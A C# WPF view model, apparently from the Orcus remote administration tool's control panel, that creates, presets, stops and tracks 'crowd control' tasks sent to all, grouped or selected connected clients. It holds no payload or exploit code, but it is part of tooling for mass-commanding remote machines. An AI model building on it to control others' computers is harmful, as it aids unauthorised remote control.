using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Data;
using Orcus.Administration.Core;
using Orcus.Administration.Core.Args;
using Orcus.Administration.Core.CommandManagement;
using Orcus.Administration.Core.CrowdControl;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.ViewModels.CrowdControl;
using Orcus.Administration.ViewModels.Utilities;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.CommandTargets;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class CrowdControlViewModel : PropertyChangedBase
    {
        private readonly ConnectionManager _connectionManager;
        private ObservableCollection<DynamicCommandViewModel> _commands;
        private ICollectionView _commandsCollectionView;
        private RelayCommand _createPresetCommand;
        private RelayCommand _createPresetWithTargetCommand;
        private RelayCommand _createTaskCommand;
        private RelayCommand _openPresetManagerCommand;
        private RelayCommand _removeAllFinishedTasksCommand;
        private RelayCommand _removeTasksCommand;
        private RelayCommand<DynamicCommandViewModel> _showExecutingClientsCommand;
        private RelayCommand _stopCommandsCommand;
        private RelayCommand _viewDynamicCommandCommand;

        public CrowdControlViewModel(ConnectionManager connectionManager)
        {
            _connectionManager = connectionManager;
            StaticCommands = StaticCommander.GetStaticCommands();
            Load();
        }

        public List<StaticCommand> StaticCommands { get; }

        public ICollectionView CommandsCollectionView
        {
            get { return _commandsCollectionView; }
            set { SetProperty(value, ref _commandsCollectionView); }
        }

        public RelayCommand CreateTaskCommand
        {
            get
            {
                return _createTaskCommand ?? (_createTaskCommand = new RelayCommand(async parameter =>
                {
                    var createTaskViewModel = new CrowdControlCreateTaskViewModel(_connectionManager,
                        (string) Application.Current.Resources["CreateTask"], CreationMode.Complete);

                    if (WindowServiceInterface.Current.OpenWindowDialog(createTaskViewModel) == true)
                    {
                        var result =
                            await
                                _connectionManager.StaticCommander.ExecuteCommand(createTaskViewModel.SelectedCommand,
                                    createTaskViewModel.TransmissionEvent, createTaskViewModel.ExecutionEvent,
                                    createTaskViewModel.StopEvent, createTaskViewModel.Conditions.ToList(),
                                    createTaskViewModel.CommandTarget);

                        if (!result)
                            WindowServiceInterface.Current.ShowMessageBox(
                                (string) Application.Current.Resources["CommandCouldNotBeTransmittedToServer"],
                                (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                                MessageBoxImage.Error);
                    }
                }));
            }
        }

        public RelayCommand OpenPresetManagerCommand
        {
            get
            {
                return _openPresetManagerCommand ?? (_openPresetManagerCommand = new RelayCommand(parameter =>
                {
                    WindowServiceInterface.Current.OpenWindowDialog(
                        new CrowdControlManagePresetsViewModel(_connectionManager));
                }));
            }
        }

        public RelayCommand CreatePresetWithTargetCommand
        {
            get
            {
                return _createPresetWithTargetCommand ?? (_createPresetWithTargetCommand = new RelayCommand(parameter =>
                {
                    var createTaskViewModel = new CrowdControlCreateTaskViewModel(_connectionManager,
                        (string) Application.Current.Resources["CreatePresetCommandWithTarget"],
                        CreationMode.Complete | CreationMode.WithName);

                    if (WindowServiceInterface.Current.OpenWindowDialog(createTaskViewModel) == true)
                    {
                        CrowdControlPresets.Current.AddPreset(new PresetInfo
                        {
                            Name = createTaskViewModel.CustomName,
                            Preset =
                                new CommandPresetWithTarget
                                {
                                    CommandTarget = createTaskViewModel.CommandTarget,
                                    Conditions = createTaskViewModel.Conditions.ToList(),
                                    ExecutionEvent = createTaskViewModel.ExecutionEvent,
                                    StaticCommand = createTaskViewModel.SelectedCommand,
                                    TransmissionEvent = createTaskViewModel.TransmissionEvent,
                                    StopEvent = createTaskViewModel.StopEvent
                                }
                        });
                    }
                }));
            }
        }

        public RelayCommand CreatePresetCommand
        {
            get
            {
                return _createPresetCommand ?? (_createPresetCommand = new RelayCommand(parameter =>
                {
                    var createTaskViewModel = new CrowdControlCreateTaskViewModel(_connectionManager,
                        (string) Application.Current.Resources["CreatePresetCommand"],
                        CreationMode.NoTarget | CreationMode.WithName);

                    if (WindowServiceInterface.Current.OpenWindowDialog(createTaskViewModel) == true)
                    {
                        CrowdControlPresets.Current.AddPreset(new PresetInfo
                        {
                            Name = createTaskViewModel.CustomName,
                            Preset =
                                new CommandPreset
                                {
                                    ExecutionEvent = createTaskViewModel.ExecutionEvent,
                                    StaticCommand = createTaskViewModel.SelectedCommand,
                                    TransmissionEvent = createTaskViewModel.TransmissionEvent,
                                    StopEvent = createTaskViewModel.StopEvent
                                }
                        });
                    }
                }));
            }
        }

        public RelayCommand RemoveTasksCommand
        {
            get
            {
                return _removeTasksCommand ?? (_removeTasksCommand = new RelayCommand(parameter =>
                {
                    var commands =
                        ((IList) parameter).OfType<DynamicCommandViewModel>().Select(x => x.DynamicCommand).ToList();
                    _connectionManager.RemoveDynamicCommands(commands);
                }));
            }
        }

        public RelayCommand RemoveAllFinishedTasksCommand
        {
            get
            {
                return _removeAllFinishedTasksCommand ?? (_removeAllFinishedTasksCommand = new RelayCommand(parameter =>
                {
                    var commands =
                        _commands.Where(
                                x =>
                                    x.DynamicCommandStatus == DynamicCommandStatus.Done ||
                                    x.DynamicCommandStatus == DynamicCommandStatus.Stopped)
                            .Select(x => x.DynamicCommand)
                            .ToList();
                    _connectionManager.RemoveDynamicCommands(commands);
                }));
            }
        }

        public RelayCommand ViewDynamicCommandCommand
        {
            get
            {
                return _viewDynamicCommandCommand ?? (_viewDynamicCommandCommand = new RelayCommand(parameter =>
                {
                    var dynamicCommandViewModel = parameter as DynamicCommandViewModel;
                    if (dynamicCommandViewModel == null)
                        return;

                    if (dynamicCommandViewModel.DynamicCommandStatus == DynamicCommandStatus.Active)
                        WindowServiceInterface.Current.OpenWindowCentered(
                            new CrowdControlExecutingClientsViewModel(dynamicCommandViewModel, _connectionManager));
                    else
                        WindowServiceInterface.Current.OpenWindowCentered(
                            new CrowdControlEventsViewModel(dynamicCommandViewModel),
                            $"{dynamicCommandViewModel.CommandType} ({dynamicCommandViewModel.DynamicCommand.Timestamp:g})");
                }));
            }
        }

        public RelayCommand StopCommandsCommand
        {
            get
            {
                return _stopCommandsCommand ?? (_stopCommandsCommand = new RelayCommand(parameter =>
                {
                    var commands =
                        ((IList) parameter).OfType<DynamicCommandViewModel>()
                        .Where(x => x.DynamicCommandStatus == DynamicCommandStatus.Active)
                        .Select(x => x.DynamicCommand)
                        .ToList();

                    _connectionManager.StopDynamicCommands(commands);
                }));
            }
        }

        public RelayCommand<DynamicCommandViewModel> ShowExecutingClientsCommand
        {
            get
            {
                return _showExecutingClientsCommand ??
                       (_showExecutingClientsCommand =
                           new RelayCommand<DynamicCommandViewModel>(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowCentered(
                                       new CrowdControlExecutingClientsViewModel(parameter, _connectionManager));
                               }));
            }
        }

        private void ConnectionManagerOnDynamicCommandAdded(object sender,
            RegisteredDynamicCommand registeredDynamicCommand)
        {
            Application.Current.Dispatcher.BeginInvoke(
                new Action(
                    () =>
                    {
                        _commands.Insert(_commands.Count,
                            RegisteredDynamicCommandToDynamicCommandsViewModel(registeredDynamicCommand));
                    }));
        }

        private void ConnectionManagerOnDynamicCommandsRemoved(object sender, List<int> e)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                foreach (
                    var item in
                    e.Select(i => _commands.FirstOrDefault(x => x.DynamicCommand.Id == i))
                        .Where(item => item != null))
                    _commands.Remove(item);
            }));
        }

        private void ConnectionManagerOnDynamicCommandEventsAdded(object sender,
            List<DynamicCommandEvent> dynamicCommandEvents)
        {
            Application.Current.Dispatcher.BeginInvoke(
                new Action(
                    () =>
                    {
                        foreach (var dynamicCommandGroup in dynamicCommandEvents.GroupBy(x => x.DynamicCommand))
                        {
                            var dynamicCommand =
                                _commands.FirstOrDefault(x => x.DynamicCommand.Id == dynamicCommandGroup.Key);

                            dynamicCommand?.AddCommandEvents(dynamicCommandGroup.ToList());
                        }
                    }));
        }

        private void ConnectionManagerOnDynamicCommandStatusUpdated(object sender,
            DynamicCommandStatusUpdatedEventArgs dynamicCommandStatusUpdatedEventArgs)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                var command =
                    _commands.FirstOrDefault(
                        x => x.DynamicCommand.Id == dynamicCommandStatusUpdatedEventArgs.DynamicCommand);
                if (command != null)
                    command.DynamicCommandStatus = dynamicCommandStatusUpdatedEventArgs.Status;
            }));
        }

        private void ConnectionManagerOnActiveCommandsChanged(object sender, ActiveCommandsUpdate activeCommandsUpdate)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                foreach (var activeCommandUpdateInfo in activeCommandsUpdate.UpdatedCommands)
                {
                    var commandViewModel =
                        _commands.FirstOrDefault(x => x.DynamicCommand.Id == activeCommandUpdateInfo.CommandId);
                    if (commandViewModel != null)
                    {
                        commandViewModel.DynamicCommandStatus = DynamicCommandStatus.Active;
                        commandViewModel.ExecutingClients.Update(activeCommandUpdateInfo.Clients.Select(
                                x => _connectionManager.ClientProvider.Clients.FirstOrDefault(y => y.Id == x))
                            .Where(x => x != null));
                    }
                }

                foreach (var commandStatusInfo in activeCommandsUpdate.CommandsDeactivated)
                {
                    var commandViewModel =
                        _commands.FirstOrDefault(x => x.DynamicCommand.Id == commandStatusInfo.CommandId);
                    if (commandViewModel != null)
                    {
                        commandViewModel.DynamicCommandStatus = commandStatusInfo.Status;
                        commandViewModel.ExecutingClients.Clear();
                    }
                }
            }));
        }

        private async void Load()
        {
            _commands =
                new ObservableCollection<DynamicCommandViewModel>(
                    (await Task.Run(() => _connectionManager.GetDynamicCommands()))
                    .Select(RegisteredDynamicCommandToDynamicCommandsViewModel).Reverse());

            var collectionView = new CollectionViewSource {Source = _commands};
            collectionView.GroupDescriptions.Add(new PropertyGroupDescription("DynamicCommandStatus"));
            collectionView.LiveGroupingProperties.Add("DynamicCommandStatus");
            collectionView.IsLiveGroupingRequested = true;
            collectionView.SortDescriptions.Add(new SortDescription("StatusPosition", ListSortDirection.Ascending));
            collectionView.LiveSortingProperties.Add("StatusPosition");
            collectionView.IsLiveSortingRequested = true;

            CommandsCollectionView = collectionView.View;

            _connectionManager.DynamicCommandsRemoved += ConnectionManagerOnDynamicCommandsRemoved;
            _connectionManager.DynamicCommandAdded += ConnectionManagerOnDynamicCommandAdded;
            _connectionManager.DynamicCommandEventsAdded += ConnectionManagerOnDynamicCommandEventsAdded;
            _connectionManager.DynamicCommandStatusUpdated += ConnectionManagerOnDynamicCommandStatusUpdated;
            _connectionManager.ActiveCommandsChanged += ConnectionManagerOnActiveCommandsChanged;
        }

        private DynamicCommandViewModel RegisteredDynamicCommandToDynamicCommandsViewModel(
            RegisteredDynamicCommand command)
        {
            command.Timestamp = command.Timestamp.ToLocalTime();
            return new DynamicCommandViewModel(command,
                command.ExecutingClientIds?.Select(
                    x => _connectionManager.ClientProvider.Clients.FirstOrDefault(y => y.Id == x)).Where(x => x != null))
            {
                CommandType =
                    StaticCommands.FirstOrDefault(
                        y => y.CommandId == command.CommandId)?.Name ??
                    (string) Application.Current.Resources["UnknownCommand"],
                Target = GetTargetName(command.Target),
                CommandSource =
                    command.PluginHash == null
                        ? "Orcus"
                        : PluginManager.Current.LoadedPlugins.OfType<StaticCommandPlugin>()
                              .FirstOrDefault(x => x.PluginHash.SequenceEqual(command.PluginHash))?
                              .PluginInfo.Name ?? (string) Application.Current.Resources["UnknownPlugin"]
            };
        }

        private string GetTargetName(CommandTarget commandTarget)
        {
            if (commandTarget == null)
                return $"{Application.Current.Resources["All"]} ({_connectionManager.ClientProvider.Clients.Count})";

            var targetdGroups = commandTarget as TargetedGroups;
            if (targetdGroups != null)
            {
                var affectedClients =
                    targetdGroups.Groups.Sum(
                        y =>
                            _connectionManager.ClientProvider.Clients.Count(
                                z => string.Equals(z.Group, y, StringComparison.OrdinalIgnoreCase)));
                return
                    $"{targetdGroups.Groups.Count} {(string) (targetdGroups.Groups.Count == 1 ? Application.Current.Resources["Group"] : Application.Current.Resources["Groups"])} ({affectedClients} {(string) (affectedClients == 1 ? Application.Current.Resources["Client"] : Application.Current.Resources["Clients"])})";
            }
            var targetedClients = (TargetedClients) commandTarget;
            return
                $"{targetedClients.Clients.Count} {(string) (targetedClients.Clients.Count == 1 ? Application.Current.Resources["Client"] : Application.Current.Resources["Clients"])}";
        }
    }
}